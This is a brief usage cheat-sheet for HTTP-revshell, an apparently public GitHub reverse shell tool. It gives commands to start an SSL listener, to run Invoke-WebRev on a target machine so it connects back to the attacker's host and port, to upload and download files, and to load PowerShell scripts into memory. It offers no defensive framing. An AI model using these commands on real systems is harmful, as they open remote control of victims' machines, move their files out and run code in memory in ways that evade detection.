### Source
https://github.com/3v4Si0N/HTTP-revshell  

### Start listener
```
$> python3 server.py <lhost> <lport> --ssl
```

### Start on target machine
```
PS> Invoke-WebRev -ip <lhost> -port <lport> -ssl
```

### Upload/download files
```
PS> upload <source/path> <C:\destination\path>
```

### Load powershellscript into memory
```
PS> loadps1 <source/path>
```

### For server: you might need to install
```
apt install libncurses5-dev
```

